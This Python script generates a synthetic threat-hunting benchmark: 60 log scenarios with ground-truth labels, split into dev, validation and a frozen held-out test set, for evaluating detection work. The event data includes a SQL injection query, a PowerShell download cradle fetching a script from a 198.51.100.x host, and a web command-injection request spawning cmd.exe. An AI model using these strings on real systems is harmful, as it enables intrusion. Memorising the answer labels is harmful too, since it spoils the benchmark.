"""
research/generate_threat_hunting_v1.py

Phase 9 Threat Hunting Benchmark Dataset Generator:
- Generates 60 deterministic scenarios across 10 evaluation categories:
  1. covered_behavior
  2. genuine_detection_gap
  3. false_lead
  4. insufficient_telemetry
  5. benign_lookalike
  6. multi_source_sequence
  7. adversarial_mutation
  8. existing_rule_duplication
  9. weak_evidence
  10. conflicting_telemetry
- Splits: DEV (30), VALIDATION (15), HELD_OUT_TEST (15 - FROZEN)
- Generates SHA-256 manifest.json
"""

from __future__ import annotations

import hashlib
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

OUTPUT_DIR = Path(__file__).resolve().parent / "datasets" / "threat_hunting_v1"
BASE_TIMESTAMP = datetime(2026, 10, 7, 12, 0, 0, tzinfo=UTC)


def make_event(
    offset_seconds: int,
    source_type: str,
    event_type: str,
    hostname: str = "CORP-WKS-01",
    username: str = "sec_user",
    process: str | None = None,
    parent_process: str | None = None,
    command_line: str | None = None,
    source_ip: str | None = None,
    destination_ip: str | None = None,
    destination_port: int | None = None,
    message: str = "",
    status_code: int | None = None,
    request_path: str | None = None,
    event_category: str | None = None,
    severity: str = "medium",
) -> dict[str, Any]:
    ts = BASE_TIMESTAMP + timedelta(seconds=offset_seconds)
    category = event_category or (
        "endpoint" if source_type == "SYSMON"
        else "network" if source_type == "ZEEK"
        else "web" if source_type == "WEB"
        else "auth" if source_type == "AUTH"
        else "general"
    )
    return {
        "timestamp": ts.isoformat(),
        "source_type": source_type,
        "source_name": "Sysmon" if source_type == "SYSMON" else "Zeek" if source_type == "ZEEK" else source_type.lower(),
        "event_type": event_type,
        "event_category": category,
        "severity": severity,
        "hostname": hostname,
        "username": username,
        "process": process,
        "parent_process": parent_process,
        "command_line": command_line,
        "source_ip": source_ip or "192.168.1.100",
        "destination_ip": destination_ip or "10.0.0.1",
        "destination_port": destination_port,
        "message": message or f"Normalized {source_type} event",
        "status_code": status_code,
        "request_path": request_path,
    }


def create_all_scenarios() -> list[dict[str, Any]]:
    scenarios: list[dict[str, Any]] = []

    # Helper to generate scenarios with deterministic indices
    # We will build 6 scenarios per category (total 6 * 10 = 60)
    # DEV gets 3, VALIDATION gets 1.5 (or 2/1), HELD_OUT gets 1.5 (or 1/2) -> exactly 30, 15, 15.

    # 1. Covered Behavior (Existing rules detect this)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "covered_behavior",
            "category_name": "Covered Behavior (Active Rule Detects)",
            "title": f"SQL Injection exploitation attempt {i}",
            "hypothesis": "Attackers injecting SQL union queries into web parameters.",
            "ground_truth": {
                "is_threat": True,
                "expected_hunt_result": "CONFIRMED",
                "expected_classification": "ALREADY_COVERED_BY_EXISTING_RULE",
                "expected_system_a_detected": True,
                "expected_system_b_detected": True,
                "mitre_technique": "T1190",
                "mitre_tactic": "Initial Access",
            },
            "events": [
                make_event(
                    i * 10,
                    "WEB",
                    "web_attack",
                    source_ip=f"198.51.100.{10 + i}",
                    request_path=f"/products/search?q=' UNION SELECT {i},password FROM users--",
                    status_code=500,
                    message="SQL injection probe detected",
                )
            ],
        })

    # 2. Genuine Detection Gap (System A misses, System B catches)
    for i in range(1, 7):
        is_powershell = (i % 2 == 1)
        if is_powershell:
            title = f"PowerShell Outbound Download Cradle {i}"
            hypo = "Adversary runs un-obfuscated PowerShell cradle downloading remote script."
            cmd = f"powershell.exe -NoP (New-Object Net.WebClient).DownloadString('http://198.51.100.{40 + i}/p.ps1')"
            proc = "powershell.exe"
            tech = "T1059.001"
        else:
            title = f"Binary Execution directly from Temporary Folder {i}"
            hypo = "Attacker executes dropped payload from AppData\\Local\\Temp."
            cmd = f"C:\\Users\\User\\AppData\\Local\\Temp\\update_stub_{i}.exe -install"
            proc = f"update_stub_{i}.exe"
            tech = "T1036.005"

        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "genuine_detection_gap",
            "category_name": "Genuine Detection Gap",
            "title": title,
            "hypothesis": hypo,
            "ground_truth": {
                "is_threat": True,
                "expected_hunt_result": "CONFIRMED",
                "expected_classification": "DETECTION_GAP",
                "expected_system_a_detected": False,  # System A lacks rule
                "expected_system_b_detected": True,   # System B candidate rule detects!
                "mitre_technique": tech,
                "mitre_tactic": "Execution",
            },
            "events": [
                make_event(
                    i * 15,
                    "SYSMON",
                    "sysmon_process_create",
                    process=proc,
                    command_line=cmd,
                    message=f"Process execution observed: {proc}",
                )
            ],
        })

    # 3. False Lead (Benign administrative activity resembling attack)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "false_lead",
            "category_name": "False Lead (Benign Admin Resemblance)",
            "title": f"Authorized System Diagnostics Routine {i}",
            "hypothesis": "Suspicious execution suspected in admin PowerShell session.",
            "ground_truth": {
                "is_threat": False,
                "expected_hunt_result": "NEGATED",
                "expected_classification": "FALSE_LEAD",
                "expected_system_a_detected": False,
                "expected_system_b_detected": False,
                "mitre_technique": "T1057",
                "mitre_tactic": "Discovery",
            },
            "events": [
                make_event(
                    i * 20,
                    "SYSMON",
                    "sysmon_process_create",
                    username="domain_admin",
                    process="powershell.exe",
                    command_line=f"powershell.exe Get-Process | Select-Object -First {i * 10}",
                    message="Routine administrative process query",
                )
            ],
        })

    # 4. Insufficient Telemetry (Missing required logging fields)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "insufficient_telemetry",
            "category_name": "Insufficient Telemetry",
            "title": f"Truncated Event Log Stream {i}",
            "hypothesis": "Anomalous process reported with missing executable path and PID.",
            "ground_truth": {
                "is_threat": False,
                "expected_hunt_result": "INSUFFICIENT_DATA",
                "expected_classification": "INSUFFICIENT_DATA",
                "expected_system_a_detected": False,
                "expected_system_b_detected": False,
                "mitre_technique": "T1070",
                "mitre_tactic": "Defense Evasion",
            },
            "events": [
                make_event(
                    i * 25,
                    "SYSMON",
                    "sysmon_process_create",
                    process=None,
                    command_line=None,
                    message="Corrupt or truncated logging frame",
                )
            ],
        })

    # 5. Benign Lookalike (Legitimate software installer or browser cache)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "benign_lookalike",
            "category_name": "Benign Lookalike",
            "title": f"Corporate Browser Edge Updater {i}",
            "hypothesis": "Suspicious background binary invocation.",
            "ground_truth": {
                "is_threat": False,
                "expected_hunt_result": "NEGATED",
                "expected_classification": "FALSE_LEAD",
                "expected_system_a_detected": False,
                "expected_system_b_detected": False,
                "mitre_technique": "T1036",
                "mitre_tactic": "Defense Evasion",
            },
            "events": [
                make_event(
                    i * 30,
                    "SYSMON",
                    "sysmon_process_create",
                    process="MicrosoftEdgeUpdate.exe",
                    command_line=f'"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe" /c /svc',
                    message="Official browser update worker",
                )
            ],
        })

    # 6. Multi-Source Sequence (Cross-layer web probe to endpoint command)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "multi_source_sequence",
            "category_name": "Multi-Source Sequence",
            "title": f"Web Exploit Spawning Child Interactive Shell {i}",
            "hypothesis": "Remote web exploit creates child cmd.exe shell on backend host.",
            "ground_truth": {
                "is_threat": True,
                "expected_hunt_result": "CONFIRMED",
                "expected_classification": "ALREADY_COVERED_BY_EXISTING_RULE",
                "expected_system_a_detected": True,
                "expected_system_b_detected": True,
                "mitre_technique": "T1059.003",
                "mitre_tactic": "Execution",
            },
            "events": [
                make_event(
                    i * 35,
                    "WEB",
                    "web_attack",
                    source_ip=f"198.51.100.{50 + i}",
                    request_path="/cgi-bin/test?cmd=whoami",
                    status_code=200,
                    message="Web exploit request",
                ),
                make_event(
                    i * 35 + 2,
                    "SYSMON",
                    "sysmon_process_create",
                    parent_process="w3wp.exe",
                    process="cmd.exe",
                    command_line="cmd.exe /c whoami",
                    message="Web server spawned child shell",
                ),
            ],
        })

    # 7. Adversarial Mutation (Obfuscated or mutated attack payload)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "adversarial_mutation",
            "category_name": "Adversarial Mutation",
            "title": f"Casing and Path Traversal Mutated Payload {i}",
            "hypothesis": "Attacker using mixed casing and redundant path separators.",
            "ground_truth": {
                "is_threat": True,
                "expected_hunt_result": "CONFIRMED",
                "expected_classification": "DETECTION_GAP",
                "expected_system_a_detected": False,
                "expected_system_b_detected": True,
                "mitre_technique": "T1036.005",
                "mitre_tactic": "Defense Evasion",
            },
            "events": [
                make_event(
                    i * 40,
                    "SYSMON",
                    "sysmon_process_create",
                    process="payload.exe",
                    command_line=f"C:\\Users\\User\\appdata\\local\\TEMP\\\\mutated_runner_{i}.exe --hidden",
                    message="Mutated temp directory execution",
                )
            ],
        })

    # 8. Existing Rule Duplication (Candidate generator tests for duplicate rules)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "existing_rule_duplication",
            "category_name": "Existing Rule Duplication Test",
            "title": f"Brute Force Authentication Failure Sequence {i}",
            "hypothesis": "Repeated authentication failures already governed by RULE-001.",
            "ground_truth": {
                "is_threat": True,
                "expected_hunt_result": "CONFIRMED",
                "expected_classification": "ALREADY_COVERED_BY_EXISTING_RULE",
                "expected_system_a_detected": True,
                "expected_system_b_detected": True,
                "mitre_technique": "T1110.001",
                "mitre_tactic": "Credential Access",
            },
            "events": [
                make_event(
                    i * 45 + j,
                    "AUTH",
                    "failed_login",
                    source_ip=f"198.51.100.{70 + i}",
                    username=f"user_{i}",
                    message="Authentication failed",
                )
                for j in range(5)
            ],
        })

    # 9. Weak Evidence (Low signal strength / low confidence)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "weak_evidence",
            "category_name": "Weak Evidence",
            "title": f"Single Transient Port Connection {i}",
            "hypothesis": "Single short-lived connection on non-standard port without follow-up.",
            "ground_truth": {
                "is_threat": False,
                "expected_hunt_result": "INCONCLUSIVE",
                "expected_classification": "FALSE_LEAD",
                "expected_system_a_detected": False,
                "expected_system_b_detected": False,
                "mitre_technique": "T1571",
                "mitre_tactic": "Command and Control",
            },
            "events": [
                make_event(
                    i * 50,
                    "ZEEK",
                    "zeek_conn",
                    destination_port=8088,
                    message="Single transient TCP connection 12 bytes transferred",
                )
            ],
        })

    # 10. Conflicting Telemetry (Source signals disagree)
    for i in range(1, 7):
        scenarios.append({
            "index": len(scenarios) + 1,
            "category": "conflicting_telemetry",
            "category_name": "Conflicting Telemetry",
            "title": f"Endpoint Disconnect with Continued Zeek Flow {i}",
            "hypothesis": "Host logs process termination while network flow continues.",
            "ground_truth": {
                "is_threat": False,
                "expected_hunt_result": "INCONCLUSIVE",
                "expected_classification": "INSUFFICIENT_DATA",
                "expected_system_a_detected": False,
                "expected_system_b_detected": False,
                "mitre_technique": "T1070",
                "mitre_tactic": "Defense Evasion",
            },
            "events": [
                make_event(
                    i * 55,
                    "SYSMON",
                    "sysmon_process_terminate",
                    process="svc_sync.exe",
                    message="Process terminated gracefully",
                ),
                make_event(
                    i * 55 + 5,
                    "ZEEK",
                    "zeek_conn",
                    destination_port=443,
                    message="Active persistent TLS tunnel established",
                ),
            ],
        })

    return scenarios


def split_scenarios(all_scenarios: list[dict[str, Any]]) -> tuple[list[dict], list[dict], list[dict]]:
    """
    Deterministically splits 60 scenarios into:
    - DEV: 30 (first 3 items of each 6-item category)
    - VALIDATION: 15 (balanced across categories)
    - HELD_OUT_TEST: 15 (balanced across categories)
    """
    dev = []
    val = []
    test = []

    # Group by category preserving order
    categories: dict[str, list[dict]] = {}
    for sc in all_scenarios:
        categories.setdefault(sc["category"], []).append(sc)

    for idx, (cat_name, items) in enumerate(categories.items()):
        # items has 6 elements
        dev.extend(items[0:3])  # 3 * 10 = 30 DEV
        if idx < 5:
            val.extend([items[3], items[4]])  # 2 * 5 = 10
            test.append(items[5])             # 1 * 5 = 5
        else:
            val.append(items[3])              # 1 * 5 = 5
            test.extend([items[4], items[5]]) # 2 * 5 = 10

    # Re-index scenario_id
    for i, sc in enumerate(dev, 1):
        sc["scenario_id"] = f"TH-DEV-{i:03d}"
    for i, sc in enumerate(val, 1):
        sc["scenario_id"] = f"TH-VAL-{i:03d}"
    for i, sc in enumerate(test, 1):
        sc["scenario_id"] = f"TH-TEST-{i:03d}"

    return dev, val, test


def compute_sha256(data: str) -> str:
    return hashlib.sha256(data.encode("utf-8")).hexdigest()


def main() -> None:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    all_scenarios = create_all_scenarios()
    dev, val, test = split_scenarios(all_scenarios)

    dev_json = json.dumps(dev, indent=2, sort_keys=True)
    val_json = json.dumps(val, indent=2, sort_keys=True)
    test_json = json.dumps(test, indent=2, sort_keys=True)

    (OUTPUT_DIR / "dev_scenarios.json").write_text(dev_json, encoding="utf-8")
    (OUTPUT_DIR / "validation_scenarios.json").write_text(val_json, encoding="utf-8")
    (OUTPUT_DIR / "held_out_test_scenarios.json").write_text(test_json, encoding="utf-8")

    manifest = {
        "dataset_name": "Threat Hunting & Closed-Loop Detection Benchmark Dataset V1",
        "version": "1.0.0",
        "total_scenarios": len(dev) + len(val) + len(test),
        "generated_at": datetime.now(UTC).isoformat(),
        "categories_covered": [
            "1: covered_behavior",
            "2: genuine_detection_gap",
            "3: false_lead",
            "4: insufficient_telemetry",
            "5: benign_lookalike",
            "6: multi_source_sequence",
            "7: adversarial_mutation",
            "8: existing_rule_duplication",
            "9: weak_evidence",
            "10: conflicting_telemetry",
        ],
        "splits": {
            "dev": {
                "file": "dev_scenarios.json",
                "scenarios_count": len(dev),
                "sha256": compute_sha256(dev_json),
            },
            "validation": {
                "file": "validation_scenarios.json",
                "scenarios_count": len(val),
                "sha256": compute_sha256(val_json),
            },
            "held_out_test": {
                "file": "held_out_test_scenarios.json",
                "scenarios_count": len(test),
                "sha256": compute_sha256(test_json),
                "status": "HELD_OUT_FROZEN",
            },
        },
    }

    manifest_json = json.dumps(manifest, indent=2, sort_keys=True)
    (OUTPUT_DIR / "manifest.json").write_text(manifest_json, encoding="utf-8")

    print(f"Generated {len(dev)} DEV, {len(val)} VAL, {len(test)} HELD_OUT_TEST scenarios.")
    print(f"Manifest written to {OUTPUT_DIR / 'manifest.json'}")


if __name__ == "__main__":
    main()
